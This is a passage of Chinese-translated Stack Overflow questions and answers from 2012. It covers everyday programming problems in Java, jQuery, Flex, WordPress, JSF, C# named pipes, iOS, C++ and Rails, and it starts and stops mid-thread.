    ImportedTableObjects next = compareInterator.next();
    nextEntry = next.identiferId;
    if(nextEntry.equals(currentEntry)) { 
    compareInterator.remove();
    } 
```

当它找到匹配项时，我试图从列表中删除匹配项。无需重新检查已匹配的条目。因此，当第一个循环继续沿列表向下时 - 它不必再次检查该条目。

但当然我得到了 ConcurrentModificationException。我完全理解为什么。有没有一种方法可以代替尝试删除条目，而可以用布尔值或其他东西标记它，所以当第一个循环到达列表中的那个条目时，它知道跳过它并转到下一个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:08:50.997

将要删除的所有元素添加到新列表中。

迭代后，调用：

```
coll1.removeAll (coll2); 
```

不是使用迭代器及其 hasNext/next，而是使用 Lists，您可以使用 for 循环从上到下进行迭代。在访问元素（6）之前删除元素（7）等等对我来说从来都不是问题，但我还没有看到它被推荐。

这里完整的代码

```
import java.util.*;

public class GuessGame 
{
    public static void main ( String [] args )
    {
        char [] ca = "This is a test!".toCharArray ();
        List <Character> ls = new ArrayList <Character> ();
        for (char c: ca)
            ls.add (c);

        show (ls);
        // first method: remove from top/end and step backwise:
        for (int i = ls.size () - 1; i >= 0; --i)
        {
            char c = ls.get (i); 
            if (c == 'i' || c == 'a' || c == 'e')
                ls.remove (i); 
        }
        show (ls);

        // second approach: collect elements to remove ...
        ls = new ArrayList <Character> ();
        for (char c: ca)
            ls.add (c);
        show (ls);
        // ... in a separate list and 
        List <Character> toRemove = new ArrayList <Character> ();
        for (char c: ls)
        {
            if (c == 'i' || c == 'a' || c == 'e')
                toRemove.add (c); 
        }
        // ... remove them all in one go:
        ls.removeAll (toRemove);
        show (ls);
    }

    private static void show (List <Character> ls)
    {
        for (char c: ls)
            System.out.print (c + " ");
        System.out.println ();
    }   
} 
```

输出：

```
T h i s   i s   a   t e s t ! 
T h s   s     t s t ! 
T h i s   i s   a   t e s t ! 
T h s   s     t s t ! 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:00:07.393

最简单的方法可能是创建另一个列表，在其中放置“匹配”条目，然后检查该列表。

# javascript - jQuery .html() 大负载

> ID：10403478
> 
> 赞同：1
> 
> 时间：2012-05-01T19:56:30.267
> 
> 标签：javascript, jquery, html, json, load

我一直在测试 jQuery .html() 函数，发现它不适用于大量文本，请参阅此[示例](http://jsfiddle.net/jackdent/AHBBz/)。然而，代码是没有错误的，并且一个非常简化的[测试用例](http://jsfiddle.net/jackdent/R2JbX/)可以完美地工作。

我知道这可能不是将大量数据包含到 div 中的最佳方式，但我打算最终从各种数组中加载数据，并且代码旨在成为一种构造函数。

所以我的问题是：我做错了什么？jQuery 不能处理这么多的文本吗？如果是这样，使用 jQuery/JavaScript/JSON 加载同一 html 的多个实例（在某些部分具有不同的文本/url）的最佳方法是什么？我应该从数组中填充数据吗？

在此先感谢，任何帮助将不胜感激。

**根据答案编辑**

嗨，谢谢，我愚蠢地忽略了一个未定义的变量。这是一个新的[工作测试用例](http://jsfiddle.net/jackdent/AHBBz/1/)。我想要完成的是让多个博客帖子遵循相同的结构公式，一次由 jQuery 6 加载到一个页面中。将此数据存储在数组中的最佳方法是什么？然后从数组中填充这些元素的内容？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T19:58:32.103

您提供的示例引发错误：

```
Uncaught ReferenceError: posterurl is not defined 
```

添加后`var posterurl = "";`，代码正确且高效地执行。

这是[一个工作小提琴](http://jsfiddle.net/JamesHill/JvRy5/)。

**注意：**这是构建页面的一种**可怕方式。**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:08:33.743

查看您扩展的问题（感谢您抽出时间），我的直觉说您最好在服务器端执行此操作。这意味着您发送的文档带有预先构建的内容，这对重要的访问者 - 谷歌有重大影响。否则，就 google-bots 而言，您的页面是空的并且可能隐藏内容，这是他们强烈反对的。服务器端构建的页面还意味着禁用 JavaScript 的访问者将获得相同的内容。动态加载内容很好并且非常有用，但是在 JavaScript 中从头开始构建如此多的页面有点太过分了（在我看来）。

# apache-flex - 替换元素中的图像

> ID：10403495
> 
> 赞同：0
> 
> 时间：2012-05-01T19:57:57.107
> 
> 标签：apache-flex

我是 Flex 和 ActionScript 新手，但我的任务是根据查询字符串替换 Flex 页面上的元素。换句话说，用户可以传入一个参数，例如 ?image=dog.png，ActionScript 将用用户传入的内容替换图像。整个页面布局在一个 .mxml 文件中。占位符图像（透明）需要替换为用户指定的内容。他们传入的图像将始终存在于 SWF 文件中。

我已经尝试了几件事，但都没有奏效。例如，我尝试更改图像的来源）：

```
view.BlankImage.source = "@Embed(source='/resources/myNewImage.png')"; 
```

我还尝试插入最初隐藏的图像，假设我可以使其在运行时可见。但是 Flex 在其页面格式中包含隐藏图像，因此即使我从不显示隐藏图像，所有内容的放置都一团糟。

这是相关的mxml：

```
<s:VGroup width="100%" bottom="0" horizontalAlign="right">
<mx:Image id="BlankSpot" source="@Embed(source='/resources/blank.medium.png')"
    visible="{!someParameter}" includeInLayout="{BlankSpot.visible}"/>
    <toolbars:SearchBox id="searchBox"/>
</s:VGroup> 
```

知道如何在运行时替换图像吗？我需要提供更多信息吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:08:10.893

多一点信息会有所帮助。我假设图像来自网络并且并非全部嵌入到应用程序中。

如果是这种情况，您可以将图像的 url 传递给新的 .png。

尝试`BlankSpot.source = "http://someurl.com/image.png`

**编辑**

由于您声明所有图像都嵌入到您的应用程序中，您可以用相对路径替换 web url。

也许是这样的：

```
var img:String = "dog.png";
BlankSpot.source = "/resources/" + img; 
```

如果您有一定数量的图像，您还可以预先定义和嵌入它们。处理此问题的一个好方法是创建一个包含所有嵌入资产的 Resources 类。

```
package {
    public final class Resources {
        [Embed (source="/resources/dog.png")] public static const DOG:Class;
      }
} 
```

然后，您可以直接在图像的源中使用它

```
BlankSpot.source = Resources.DOG; 
```

此外，您似乎正在使用 Flex 4，`<s:VGroup>`因此您也应该切换到 spark 图像。

如果这里没有使用 mx 图像的特定原因，请将该块替换为

```
<s:Image id="BlankSpot" source="@Embed(source='/resources/blank.medium.png')"
visible="{!someParameter}" includeInLayout="{BlankSpot.visible}"/> 
```

# php - 在wordpress，php中将控制变量添加到$_REQUEST

> ID：10403499
> 
> 赞同：1
> 
> 时间：2012-05-01T19:58:14.553
> 
> 标签：php, wordpress

我想在页面之间传递一个变量。这是整个站点的控制变量，我们称之为季节。该变量具有当前季节的默认值（管理中的自定义变量），并且可以通过链接进行更改。（一些存档，如 url: ...?season=1）

如果设置了，我希望在整个网站上进行此操作。例如，第 1 页的链接将从 ...?pageid=1 更改为 ...?pageid=1&season=1 。对于所有链接。基本上，我希望这个季节成为我在每个页面中显示的内容的控制变量。

如何在 wordpress 中最简单地做到这一点？

我也尝试了 cookie 和 session，但没有成功（存储这个变量）。执行诸如“无论下一页是什么，将这个变量传递给它，以便它在 $_REQUEST 中可读”之类的正确代码是什么？

谢谢，西罗

编辑：

```
<?php
function get_season_ID()
{
    if (array_key_exists('cat', $_REQUEST))
    {
        $c= $_REQUEST['cat'];
        //I whant to pass $c to the next page whatever that is.
        return $_REQUEST['cat'];
    }
    else
    {
        return get_custom('current_season_category_id');
    }
}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:06:29.227

为什么需要变量在`$_REQUEST`?

如果您在管理员中设置变量，我认为这意味着您将其保存在`wp_options`表中。如果它保存在 wp_options 表中，您可以使用`get_option('season')`.

# java - 在 xhtml JSF 中检查会话访问

> ID：10403504
> 
> 赞同：0
> 
> 时间：2012-05-01T19:58:46.267
> 
> 标签：java, session, jsf, authorization

我正在做一个资产管理系统。系统中有管理员、子管理员和受限用户三类用户。管理员可以做任何事情，子管理员只用于验证数据，受限用户只能看到刚刚完成的数据/ 查看数据

在数据库中，**访问权限**的特征是 number.Administrator = 0，SubAdmin = 1，以及受限用户 = 2。

要进入系统，每个用户都必须登录，在登录时，**访问权限**保存到会话中。问题，如何检查 servlet 文件 (.xhtml) 中的会话？例如DataTable中有数据。有菜单“编辑”、“删除”和“验证”。如果管理员登录，则菜单“编辑，删除”将出现在表格行中，如果SubAdmin登录，则只出现菜单“验证”，如果受限用户登录，则菜单不出现。

我应该在文件中检查 servletnya 会话，还是有其他方法？如何 ？

非常感谢..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:04:56.443

首先，XHTML 文件不是[Servlet](https://stackoverflow.com/tags/servlets/info)文件。这是一个[Facelets](https://stackoverflow.com/tags/facelets/info)文件。Facelets 是一种基于 XML 的视图技术。

至于您的具体问题，只需在 JSF 组件的`rendered`属性中确定即可。如果布尔条件为`false`，则 JSF 根本不会渲染组件（并且在提交时也不会处理它，因此您也可以安全地防止被篡改的请求）。

假设登录用户是`User`EL 范围内可用的 javabean as `#{user}`，并且有一个`hasRole()`采用 a`String`并返回 a的方法`boolean`，那么您可以这样做：

```
<h:commandButton value="delete" rendered="#{user.hasRole('admin')}" /> 
```

有一些变化，比如只有一个`isAdmin()`方法返回`boolean`：

```
<h:commandButton value="delete" rendered="#{user.admin}" /> 
```

或者有一个`getRoles()`返回 a 的方法`Collection`：

```
<h:commandButton value="delete" rendered="#{user.roles.contains('admin')}" /> 
```

如有必要，您也可以使用 integer`0`而不是 string `admin`，但这样的自我记录较少。

### 也可以看看：

*   [有条件地显示 JSF 组件](https://stackoverflow.com/questions/4870462/conditionally-displaying-jsf-components)

* * *

但是请注意，您基本上是家庭种植授权。您还可以考虑使用 Java EE 内置[容器管理的身份验证](http://docs.oracle.com/javaee/6/tutorial/doc/bncas.html)和授权。然后，您可以使用[`HttpServletRequest#isUserInRole()`](http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#isUserInRole%28java.lang.String%29)来授权用户。这很像`User#hasRole()`建议：

```
<h:commandButton value="delete" rendered="#{request.isUserInRole('admin')}" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:25:23.720

在 Web 应用程序中使用[Spring Security](http://static.springsource.org/spring-webflow/docs/2.2.x/reference/html/ch13s09.html)时，借助特殊标签可以轻松解决您的问题：

```
<sec:authorize ifAllGranted="ADMINISTRATOR">
    <h:commandButton value="edit" />
    <h:commandButton value="delete" />
</sec:authorize>
<sec:authorize ifNotGranted="SUBADMIN">
    <h:commandButton value="verify" />
</sec:authorize> 
```

为此，只需在页面的命名空间中添加：

```
xmlns:sec="http://www.springframework.org/security/tags" 
```

并将这个[库](http://static.springsource.org/spring-security/site/downloads.html)连接到您的项目。

您还可以了解您可以使用的 Spring Security 的其他有用的[好处](http://static.springsource.org/spring-security/site/features.html)。

# c# - 命名管道传输的可序列化包装类

> ID：10403509
> 
> 赞同：1
> 
> 时间：2012-05-01T19:59:10.793
> 
> 标签：c#, serialization, deserialization, named-pipes, binaryformatter

我正在尝试使用命名管道创建跨应用程序 asp.net 缓存服务（类似于 memcached 或 AppFabric/Velocity）。基本前提是您可以获取或设置在连接到命名管道的任何其他应用程序之间共享的缓存项。

其中一部分要求您发送到缓存的对象被序列化为 byte[] 以方便 PipeStream.Read() 和 PipeStream.Write() 方法。由于缓存将保存任意数量的任意对象类型/类，我不想在每个对象上都设置 [Serializable] 属性，因此我选择创建一个 [Serializable] 的包装类并具有我可以用来传输缓存项的通用对象类型字段，类似于此处使用的方法：[http ://www.eggheadcafe.com/articles/20060404.asp](http://www.eggheadcafe.com/articles/20060404.asp)

一切似乎最初都适用于内置类型，但现在我正在尝试发送一个 List<> 的自定义类型（一个类）的对象，并且我遇到了一个异常，我的自定义类需要是 [可序列化] ...这是我试图避免的。

这是代码：

服务器-

```
class Server
{
    static Dictionary<string, object> Cache = new Dictionary<string, object>();
    static Dictionary<string, DateTime> CacheExpireTime = new Dictionary<string, DateTime>();
    static void Main(string[] args)
    {
        new Thread(HandleGets).Start();
        new Thread(HandleSets).Start();         
    }       
    static protected void HandleSets()
    {
        PipeSecurity ps = new PipeSecurity();
        PipeAccessRule par = new PipeAccessRule("Everyone",  PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow);
        ps.AddAccessRule(par);
        while (true)
        {
            using (NamedPipeServerStream pipeServer = new NamedPipeServerStream("MemCacheSet", PipeDirection.In, 1, PipeTransmissionMode.Byte, PipeOptions.None, 0, 0, ps))
            {
                pipeServer.WaitForConnection();
                CacheAction ca = CacheAction.FromBytes(pipeServer.ReadAll());                   
                Cache[ca.DictionaryKey] = ca.DictionaryValue;
                CacheExpireTime[ca.DictionaryKey] = ca.TimeOfExpire;
            }
        }
    }
    static protected void HandleGets()
    {
        PipeSecurity ps = new PipeSecurity();
        PipeAccessRule par = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, System.Security.AccessControl.AccessControlType.Allow);
        ps.AddAccessRule(par);
        while (true)
        {
            using (NamedPipeServerStream pipeServer = new NamedPipeServerStream("MemCacheGet", PipeDirection.InOut,1,PipeTransmissionMode.Byte,PipeOptions.None,0,0,ps))
            {
                pipeServer.WaitForConnection();
                CacheAction ca = CacheAction.FromBytes(pipeServer.ReadAll());                   
                CacheAction resp = new CacheAction();
                resp.DictionaryKey = ca.DictionaryKey;
                if (Cache.ContainsKey(ca.DictionaryKey) && CacheExpireTime[ca.DictionaryKey]>=DateTime.Now)                 
                    resp.DictionaryValue = Cache[ca.DictionaryKey];                 
                pipeServer.WriteAll(resp.ToBytes());
            }
        }
    }
} 
```

客户端方法（在静态类中）-

```
 static object GetItem(string inKey)
    {
        object rVal;
        using (NamedPipeClientStream pipeStream = new NamedPipeClientStream(".", "MemCacheGet", PipeDirection.InOut))
        {
            pipeStream.Connect();
            CacheAction ca = new CacheAction();
            ca.DictionaryKey = inKey;
            pipeStream.WriteAll(ca.ToBytes());
            ca = CacheAction.FromBytes(pipeStream.ReadAll());
            rVal = ca.DictionaryValue;
        }
        return rVal;
    }   
    static void SetItem(string inName, object inItem, TimeSpan? expireTime = null)
    {
        if (!expireTime.HasValue)
            expireTime = new TimeSpan(0, 10, 0);
        using (NamedPipeClientStream pipeStream = new NamedPipeClientStream(".", "MemCacheSet", PipeDirection.Out))
        {
            pipeStream.Connect();
            CacheAction ca = new CacheAction();
            ca.DictionaryKey = inName;
            ca.DictionaryValue = inItem;
            ca.TimeOfExpire = DateTime.Now + expireTime.Value;
            pipeStream.WriteAll(ca.ToBytes());
        }
    } 
```

共享代码：

```
[Serializable]
public class CacheAction
{
    public string DictionaryKey;
    public object DictionaryValue;
    public DateTime TimeOfExpire;
    public static CacheAction FromBytes(byte[] inBytes)
    {           
        BinaryFormatter bf = new BinaryFormatter();
        MemoryStream ms = new MemoryStream(inBytes);
        CacheAction p = (CacheAction)bf.Deserialize(ms);
        return p;
    }
    public byte[] ToBytes()
    {
        BinaryFormatter bf = new BinaryFormatter();
        MemoryStream ms = new MemoryStream();
        bf.Serialize(ms, this);
        return ms.ToArray();
    }
}
public static class MyExtensions
{
    public static byte[] ReadAll(this NamedPipeClientStream np)
    {
        byte[] size = new byte[4];
        np.Read(size, 0, 4);
        int iSize = BitConverter.ToInt32(size, 0);
        byte[] rVal = new byte[iSize];
        np.Read(rVal, 0, iSize);
        return rVal;
    }
    public static byte[] ReadAll(this NamedPipeServerStream np)
    {
        byte[] size = new byte[4];
        np.Read(size, 0, 4);
        int iSize = BitConverter.ToInt32(size, 0);
        byte[] rVal = new byte[iSize];
        np.Read(rVal, 0, iSize);
        return rVal;
    }
    public static void WriteAll(this NamedPipeClientStream np, byte[] toWrite)
    {
        byte[] size = BitConverter.GetBytes(toWrite.Length);
        np.Write(size, 0, size.Length);
        np.Write(toWrite, 0, toWrite.Length);
    }
    public static void WriteAll(this NamedPipeServerStream np, byte[] toWrite)
    {
        byte[] size = BitConverter.GetBytes(toWrite.Length);
        np.Write(size, 0, size.Length);
        np.Write(toWrite, 0, toWrite.Length);
    }
} 
```

最后是导致问题的特定用例：

```
class MemCachedSession
    {
        public string SessionId { get; set; }
        public DateTime Created { get; set; }
        public DateTime Expires { get; set; }
        public DateTime LockDate { get; set; }
        public int LockId { get; set; }
        public int Timeout { get; set; }
        public bool Locked { get; set; }
        public string SessionItems { get; set; }
        public int Flags { get; set; }
    } 
```

像这样使用：

```
SetItem("MemCacheSessionStateProvider", new List<MemCachedSession>(), new TimeSpan(7, 0, 0, 0, 0)) 
```

抛出的异常是在调用 bf.Serialize(ms,this) 时的 ToBytes() 方法中，它说：“在 Assembly 'API 中键入 'MemCachedSession'，版本 = 1.0.0.0，Culture=neutral，PublicKeyToken=null'未标记为可序列化。'"

（编辑）为什么会这样，和/或我什至在做我想做的事情的正确轨道上？（编辑）

整个想法是封装类（CacheAction）将是可序列化的，以防止这种情况，这在某种程度上确实有效，但不适用于这个自定义类（MemCachedSession）。

很抱歉这个大问题，也许答案也不简单（即整个方法是错误的），但如果有人能花时间提供一些见解，我们将不胜感激！谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T17:32:05.153

默认情况下，序列化器只能序列化原始类型。任何其他类型都必须使用该属性进行标记`Serializable`才能有资格进行序列化。

举个例子：

```
[Serializable] class AClass {
    int myInt;
    long myLong;
    string myString;
}

[Serializable] class BClass {
    int myInt;
    AClass myAClass;
}

[Serializable] class CClass {
    int myInt;
    DClass otherClass;
}

class DClass {
    int myInt;
    long myLong;
    string myString;
} 
```

`AClass`可以序列化，因为它只包含原语并且被修饰为`Serializable`.

`BClass`可以序列化，因为它的整个对象图是原始的或`Serializable`.

`CClass`被装饰为`Serializable`，但在尝试序列化时会抛出错误，因为它包含一个不是的成员。这可以通过将`otherClass`声明替换为 来防止`[NonSerialized] DClass otherClass;`，但是这对您的情况没有帮助，因为该成员不会像属性所暗示的那样与对象图的其余部分一起序列化。

`DClass`即使它不包含任何非原始字段也无法序列化，因为它没有被修饰为`Serializable`.

更多信息可以在 MSDN 网站上找到：http: [//msdn.microsoft.com/en-us/library/vstudio/ms233843.aspx](http://msdn.microsoft.com/en-us/library/vstudio/ms233843.aspx)

TLDR；整个方法是错误的——所有缓存的对象都必须标记为可序列化。

# xcode - iOS5：在 segue 期间数据未传递给 UI 对象

> ID：10403510
> 
> 赞同：0
> 
> 时间：2012-05-01T19:59:17.490
> 
> 标签：xcode, ios5

我正在学习/体验 iOS 和故事板。在 segue 期间将数据从表视图控制器传递到详细视图控制器时遇到一些问题。

CSViewDetailViewController.h

```
@interface CSViewTopicDetailViewController : UIViewController {
    UILabel* topicTitleLabel;
    UITextView* topicDescriptionTextView;
}

@property (nonatomic, strong) UILabel *topicTitleLabel;
@property (nonatomic, strong) UITextView *topicDescriptionTextView;

@end 
```

CSListTopicsViewController.m

```
 #pragma mark Table view selection
    -(void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
        if([[segue identifier] isEqualToString:@"CreateTopicSegue"]) {
            CSCreateTopicViewController *cvc = (CSCreateTopicViewController *)[segue destinationViewController];
            cvc.delegate = self;
        }
        else if ([[segue identifier] isEqualToString:@"ViewTopicDetailSegue"]) {
            NSLog(@"Preparing to segue to the View Topic view controller...");
            CSViewTopicDetailViewController *controller = (CSViewTopicDetailViewController *)[segue destinationViewController];
            NSIndexPath * indexPath = (NSIndexPath*) sender;

            controller.topicDescriptionTextView.text = topic.topicDescription;
            controller.topicTitleLabel.text = topic.topicTitle;
            controller.title = topic.topicTitle;
    NSLog(@"Set title label to: %@ from: %@", controller.topicTitleLabel.text, topic.topicTitle);
        NSLog(@"Set title label to: %@ from: %@", controller.topicTitleLabel.text, topic.topicTitle);

            NSLog(@"Segueing to the View Topic view controller...");
        }
    } 
```

输出：

```
2012-05-01 13:51:01.301 ConversationStarters[42517:fb03] Preparing to segue to the View Topic view controller...
2012-05-01 13:51:01.302 ConversationStarters[42517:fb03] Set title label to: (null) from: Test topic 1
2012-05-01 13:51:01.303 ConversationStarters[42517:fb03] Segueing to the View Topic view controller... 
```

可以看到segue被调用，行设置UILabel执行，Topic对象中的数据设置/不为空。但无论出于何种原因，UILabel 都没有存储传递给它的文本值。

有什么想法吗？提前致谢。

# c++ - 命名空间上的变量总是有默认值吗？

> ID：10403512
> 
> 赞同：0
> 
> 时间：2012-05-01T19:59:34.830
> 
> 标签：c++, namespaces, default-value

这是有问题的代码：

```
#ifndef _ALTERFPS_H
#define _ALTERFPS_H

#include "HUDLuaFunctions.h"
#include "AlterFPSNodes.h"

namespace AlterFPS
{
    namespace Globals
    {
        static bool teamAwareness;
        static int teams[] = {0, 0};

        static bool getAwareness() {
            return teamAwareness;    
        }

        static void setAwareness(bool aware) {
            teamAwareness = aware;
        }
    }
}

#endif 
```

问题是 teamAwareness 总是错误的。

我对 getter 和 setter 进行断点（我将它们放在那里用于调试目的，我知道这不是 Java）并发现 setter 确实将变量设置为 true，但随后对 getAwareness 的调用显示 teamAwareness 为 false（没有 setAwareness 调用介于两者之间）......这怎么可能？我如何解决它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:33:23.953

具有静态生命周期的变量总是零初始化。其中包括：

*   命名空间变量（包括全局命名空间），无论是否静态。
*   局部静态变量。
*   成员静态变量。

零初始化，使其变得简单，意味着：

*   如果是数字类型：0
*   如果是布尔值：false
*   如果是指针：NULL
*   如果是 enum: 0 强制转换为 enum 类型
*   如果是类类型：默认构造。

但是您的问题与此无关，这是因为您的变量已声明`static`并且它位于头文件中，因此包含它的每个编译单元（.cpp 文件）实际上都会看到它自己的变量实例。如果您从一个 .cpp 文件更改它，您将看不到另一个更改。

您要做的是`extern`在 .h 文件中声明变量，然后在任何 .cpp 文件中正常定义它（不带修饰符）：

```
//.h file
namespace Globals
{
    extern bool teamAwareness; 

    inline void setAwareness(bool aware) {
        teamAwareness = aware;
    }
}

//.cpp file
namespace Globals
{
    bool teamAwareness; 
} 
```

顺便说一句，该函数更好地声明`inline`。

# jquery - 使用最少的标记和哈希标签的简单“滚动到/向下”效果

> ID：10403513
> 
> 赞同：6
> 
> 时间：2012-05-01T19:59:43.117
> 
> 标签：jquery, scroll, scrollto, hashtag

我正在制作一个顶部有经典导航的单页网站。现在，我将链接设置为哈希标签，以便在页面内导航：

```
<nav>
<a href="#about">About</a>
</nav>
...
<section id="about">...</section> 
```

显然，这是可行的，但跳转到 about 部分是即时的，而不是渐进的。我正在寻找一个非常简单的实现，以便逐步过渡。我不想要任何花哨的东西。没有轴、偏移或任何其他选项。我只希望滚动过渡是渐进的。我想要的唯一设置是完成滚动所需的时间。另外，我想对我的标记几乎不做任何更改。我见过几个 javascript 插件，它们要求您使用锚标记来设置 html 文档中的位置——我不希望这样。[这个网站](http://www.fluidbyte.net/really-simple-jquery-scroll-to-function)看起来很有希望，但我不知道如何设置它。没有演示，所以我看不到如何设置它。我不是那么懂 Javascript。此外，[ScrollTo 插件](http://flesler.blogspot.com/2007/10/jqueryscrollto.html)对于 jQuery 来说太复杂了。我愿意使用一个有很多选项的插件，但我只是不希望这些选项阻止我弄清楚如何设置它。

任何帮助将非常感激！

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-05-01T20:06:55.490

这是我发现的最好的方法——它只使用普通的锚，但扩展了它们的功能

```
$('a').click(function() {
    var elementClicked = $(this).attr("href");
    var destination = $(elementClicked).offset().top;
    $("html:not(:animated),body:not(:animated)").animate({ scrollTop: destination-15}, 500);
}); 
```

这是一个[活生生的例子](http://jsfiddle.net/jackdent/Z8XDG/)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-05-01T20:04:07.340

我使用直接 jquery 来做到这一点。

我有一个这样的链接->

```
<a href="1" class="scrolling">Go to 1</a> 
```

然后使用 jquery 它会向下滚动到一个 div 与另一个 id 为“1”的锚点

```
$("a.scrolling").click(function(e) {
    e.preventDefault();
    goToByScroll($(this).attr("href"));
});

function goToByScroll(id) {
    $('html,body').animate({scrollTop: $("#"+id).offset().top},'slow');                               
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-01T20:05:33.253

Javascript中有ScrollTo。这是一个窗口事件。在这里查看： [https ://developer.mozilla.org/en/DOM/window.scrollTo](https://developer.mozilla.org/en/DOM/window.scrollTo)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-06-02T21:42:25.553

我在互联网上找到了这段代码，同时寻找一种快速创建此滚动效果的方法。

html代码：

```
<a href="#services">Jump to services</a>
<div id="services"></div> 
```

jQuery代码：

```
$(document).ready(function(){
$('a[href^="#"]').on('click',function (e) {
    e.preventDefault();

    var target = this.hash,
    $target = $(target);

    $('html, body').stop().animate({
        'scrollTop': $target.offset().top
    }, 900, 'swing', function () {
        window.location.hash = target;
    });
}); 
```

});

这是[代码源](http://www.paulund.co.uk/smooth-scroll-to-internal-links-with-jquery)。

# ruby-on-rails-3 - 向 Rails 控制器添加其他页面？

> ID：10403514
> 
> 赞同：1
> 
> 时间：2012-05-01T19:59:46.380
> 
> 标签：ruby-on-rails-3, routes

我在我的 Rails 3 应用程序中提供了一个名为报告的控制器。控制器的索引部分如下所示：

```
def index
    #@reports = Report.all

    @clinical_income_by_month = Clinical.income_by_month                      
    @clinical_income_by_employee = Clinical.income_by_employee
    @clinical_income_by_vet = Clinical.income_by_vet                          
    @consult_consult_times = Consult.consult_times
      @clinical_healthplan_high_spenders = Clinical.healthplan_high_spenders

    respond_to do |format|
      format.html # index.html.erb
      format.json { render json: @reports }
    end
  end 
```

index.html.erb 代码如下所示：

```
<h6><b>Financial Reports</b></h6>
    <dl class="vertical">
      <dd><a href="/income_by_month">Income by Month</a></dd>
      <dd><a href="/income_by_employee">Income by Employee</a></dd>
      <dd><a href="/income_by_vet">Income by Vet</a></dd>
 </dl> 
```

我已将最初全部在 jQuery 选项卡下的 index.html.erb 中的报告拆分为它们自己的页面。

加载各个报告的链接的最佳方法是什么？目前，如果我访问链接或手动输入[http://0.0.0.0:3000/reports/income_by_month.html](http://0.0.0.0:3000/reports/income_by_month.html)我会收到未知页面错误。

任何指针将不胜感激！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-02T02:02:20.723

One of your first steps is to add methods in your controller for each of the different reports. These go in your `config/routes.rb` file:

```
resource :reports do
  member do
    get 'income_by_month'
    get 'income_by_employee'
    get 'income_by_vet'
  end 
end 
```

The result of this is to give you paths to your reports of:

```
income_by_month_reports    GET    /reports/income_by_month
income_by_employee_reports GET    /reports/income_by_employee
income_by_vet_reports      GET    /reports/income_by_vet 
```

Then, in your erb the best way to refer to the reports using `_path` variables like so:

```
<h6><b>Financial Reports</b></h6>
<dl class="vertical">
  <dd><a href='<%= income_by_month_reports_path %>'>Income by Month</a></dd>
  <dd><a href='<%= income_by_employee_reports_path %>'>Income by Employee</a></dd>
  <dd><a href='<%= income_by_vet_reports_path %>'>Income by Vet</a></dd>
</dl> 
```

A good place for you to start is this primer called ["Ruby on Rails Guides: Rails Routing from the Outside In"](http://guides.rubyonrails.org/routing.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:22:39.350

好吧，你可以这样做，通过将一些路由连接到控制器中的新操作：

```
# in config/routes.rb
map '/income_by_month',    :to => 'reports#income_by_month'
map '/income_by_employee', :to => 'reports#income_by_employee'
map '/income_by_vet',      :to => 'reports#income_by_vet'

# in reports_controller
def income_by_month
  @clinical_income_by_month = Clinical.income_by_month
end
def income_by_employee
  @clinical_income_by_employee = Clinical.income_by_employee
end
def income_by_vet
  @clinical_income_by_vet = Clinical.income_by_vet
end 
```

但在我看来，Rails 的做法更像是这样：

```
# index.html.erb
<h6><b>Financial Reports</b></h6>
<dl class="vertical">
  <dd><a href="/reports?by=month">Income by Month</a></dd>
  <dd><a href="/reports?by=employee">Income by Employee</a></dd>
  <dd><a href="/reports?by=vet">Income by Vet</a></dd>
</dl>

# in reports_controller
def index
  @clinical_income = case params[:by]
  when 'month'    then Clinical.income_by_month                      
  when 'employee' then Clinical.income_by_employee
  else Clinical.income_by_vet
  end
end 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:44:52.633

另一种方法可能是

```
#config/routes.rb
resources :reports do
  collection do
    get "income_by_month"
    get "income_by_employee"
    get "income_by_vet"
  end
end 
```

并在您的报告控制器中映射这些功能

# c++ - 我在编程这个 SUVAT 时做错了什么

> ID：10403515
> 
> 赞同：0
> 
> 时间：2012-05-01T19:59:49.440
> 
> 标签：c++, math

我正在为 A-Level 数学编写这个软件，我正在做力学部分，我正在做一个只有 UVA 数字的 suvat，我需要找到 S 而我没有 T。所以我重新安排了 v^2=u ^2+2as 得到 (v^2-u^2)/2a=s 但我只是没有得到正确的答案！怎么了：L。. .

```
if(selection == "1") {
float s,u,v,a,t;
cout<<"What is the value of U (Initial Velocity)" << endl;
cin >> u;
cout<<"What is the value of V (Final Velocity)" << endl;
cin >> v;
cout<<"What is the value of A (Acceleration)" << endl;
cin >> a;

s = (pow(2,v) - pow(2,u))/ (2*a);

cout << "The Value of S is "<< s << ". Dont forget unit!";
i++;
} 
```

. . . .

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:01:37.567

你把论点混为一谈[`pow`](http://www.kev.pulo.com.au/pp/RESOURCES/cplusplus/ref/cmath/pow.html)了。你实际上在做：

```
float vsq = pow(2, v); /* 2^v */
cout << vsq << endl; 
```

根据 的定义`pow(x,y)`：

> 返回 的值`x`的 次方`y`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:05:19.037

您在使用`pow`功能时有错误。要表达 v^2，您需要使用`pow(v,2)`.

所以你的计算应该是：

```
s = (pow(v,2) - pow(u,2))/ (2*a); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T21:43:13.123

注意 pow 函数参数的顺序！！

你可以简单地做：

```
